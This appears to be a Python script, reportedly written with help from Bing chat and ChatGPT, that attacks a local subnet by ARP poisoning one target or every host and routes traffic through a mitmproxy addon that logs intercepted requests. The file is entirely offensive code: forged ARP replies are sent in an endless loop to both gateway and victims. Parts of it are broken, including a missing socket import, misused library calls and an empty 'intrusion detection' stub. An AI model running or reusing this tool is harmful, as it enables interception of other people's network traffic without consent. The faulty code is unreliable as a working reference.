
print("""
   __ __ ___ _____ _____ ___ _____ ___ _ ___ ___ 
  | \/ |_ _|_ _| |_ _/ __|_ _|_ _| | | __| _ \
  | |\/| || | | | | || (_ | | | | || |__| _|| /
  |_| |_|___| |_| |_| \___| |_| |___|____|___|_|_\
                                                       
A Python script for performing a MITM attack on a subnet using ARP poisoning and mitmproxy

Author: jxc22 in collaboration Bing chat (gpt4) and Chatgpt (3.5)
Date: 15 aug 2023

Usage: python mitm.py [-h] -t TARGET -g GATEWAY [-p PROXY]
""")

# Import the required modules
import argparse
import logging
import threading
import requests
import scapy.all
import mitmproxy

# Define the command-line arguments
parser = argparse.ArgumentParser(description="A Python script for performing a MITM attack on a subnet using ARP poisoning and mitmproxy")
parser.add_argument("-t", "--target", type=str, required=True,
                    help="The target IP address or subnet in CIDR notation (e.g., 192.168.1.2 or 192.168.1.0/24) or 'all' for the whole subnet")
parser.add_argument("-g", "--gateway", type=str, required=True,
                    help="The IP address of the gateway/router (e.g., 192.168.1.1)")
parser.add_argument("-p", "--proxy", type=str,
                    help="The host:port of the proxy server (e.g., 127.0.0.1:8080)")
args = parser.parse_args()

# Configure the logging module
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s - %(levelname)s - %(message)s",
                    filename="mitm.log",
                    filemode="w")

# A function that performs ARP poisoning on the target IP or subnet and the gateway
def arp_poisoning(target, gateway_ip):
    # Get MAC address of the gateway
    _, gateway_mac = scapy.all.sr(scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.all.ARP(pdst=gateway_ip), verbose=False)
    if gateway_mac:
        gateway_mac = gateway_mac[0][1].src
    else:
        logging.error(f"Failed to get MAC address for {gateway_ip}")
        return

    # Craft ARP packets to poison the gateway
    gateway_arp = scapy.all.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target)

    # If target is 'all', poison the whole subnet
    if target == "all":
        target_subnet = gateway_ip.rsplit(".", 1)[0] + ".0/24"
        target_mac_dict = get_all_target_macs(target_subnet)
        target_arp_packets = [
            scapy.all.ARP(op=2, pdst=ip, hwdst=target_mac, psrc=gateway_ip) for ip, target_mac in target_mac_dict.items()
        ]
    # Else, poison only the target IP
    else:
        target_ip = target
        target_mac = get_mac(target_ip)
        if target_mac:
            target_arp_packets = [
                scapy.all.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            ]
        else:
            logging.error(f"Failed to get MAC address for {target_ip}")
            return

    # Send ARP packets to poison the gateway and the target(s) continuously
    while True:
        scapy.all.send(gateway_arp, verbose=False)
        scapy.all.send(target_arp_packets, verbose=False)

# A function that gets the MAC address of a given IP address
def get_mac(ip):
    # Send ARP request to get the MAC address of the target IP
    ans, _ = scapy.all.sr(scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.all.ARP(pdst=ip), verbose=False)
    if ans:
        return ans[0][1].src

# A function that gets all the MAC addresses of the hosts in the target subnet
def get_all_target_macs(target_subnet):
    target_mac_dict = {}
    for ip in scapy.all.IPNetwork(target_subnet):
        mac = get_mac(str(ip))
        if mac:
            target_mac_dict[str(ip)] = mac
    return target_mac_dict

# A function that prints all the IP addresses, host names, and MAC addresses of the hosts in the target subnet
def print_all_target_info(target_subnet):
    target_info_list = []
    for ip in scapy.all.IPNetwork(target_subnet):
        mac = get_mac(str(ip))
        if mac:
            hostname = socket.gethostbyaddr(str(ip))[0]
            target_info_list.append((str(ip), hostname, mac))
    print(f"{'IP Address':<15} {'Host Name':<30} {'MAC Address':<20}")
    print("-" * 65)
    for ip, hostname, mac in target_info_list:
        print(f"{ip:<15} {hostname:<30} {mac:<20}")

# A function that performs AI-based intrusion detection on the intercepted packets
def ai_based_intrusion_detection(packet):
    if packet.haslayer(scapy.all.IP):
        ip_layer = packet.getlayer(scapy.all.IP)

        if packet.haslayer(scapy.all.TCP):
            tcp_layer = packet.getlayer(scapy.all.TCP)
            src_port = tcp_layer.sport
            dst_port = tcp_layer.dport
            # Perform analysis on TCP packets

        elif packet.haslayer(scapy.all.UDP):
            udp_layer = packet.getlayer(scapy.all.UDP)
            src_port = udp_layer.sport
            dst_port = udp_layer.dport
            # Perform analysis on UDP packets

        # Perform analysis on IP packets

# A class that inherits from the mitmproxy.http.HTTPFlow class and overrides the request and response methods
class MITMProxyAddon(mitmproxy.http.HTTPFlow):
    # A method that is called when a request is received by mitmproxy
    def request(self, flow: mitmproxy.http.HTTPFlow):
        # Log the request details
        logging.info(f"Request: {flow.request.method} {flow.request.url}")
        # Perform AI-based intrusion detection on the request
        ai_based_intrusion_detection(flow.request)

    # A method that is called when a response is received by mitmproxy
    def response(self, flow: mitmproxy.http.HTTPFlow):
        # Log the response details
        logging.info(f"Response: {flow.response.status_code} {flow.response.reason}")
        # Perform AI-based intrusion detection on the response
        ai_based_intrusion_detection(flow.response)

# A function that starts mitmproxy for MITM with SSL-stripping
def start_mitmproxy(proxy_host, proxy_port):
    # Create an instance of the MITMProxyAddon class
    addon = MITMProxyAddon()
    # Register the addon for mitmproxy
    mitmproxy.addons.add(addon)
    # Start mitmproxy with the proxy host and port as arguments
    mitmproxy.mitmweb(["-p", f"{proxy_host}:{proxy_port}"])
    # Print a message to tell the user to open the web interface of mitmproxy in their browser
    print(f"Please open http://{proxy_host}:{proxy_port}/ in your browser to see the web interface of mitmproxy")

# The main function that starts the attack
def main():
    # Start ARP poisoning in a separate thread
    arp_thread = threading.Thread(target=arp_poisoning, args=(args.target, args.gateway))
    arp_thread.start()

    # Start mitmproxy in a separate thread if proxy is specified
    if args.proxy:
        proxy_host, proxy_port = args.proxy.split(":")
        mitmproxy_thread = threading.Thread(target=start_mitmproxy, args=(proxy_host, proxy_port))
        mitmproxy_thread.start()

    # Wait for the ARP poisoning thread and mitmproxy thread to finish before exiting
    arp_thread.join()
    if args.proxy:
        mitmproxy_thread.join()

if __name__ == "__main__":
    main()

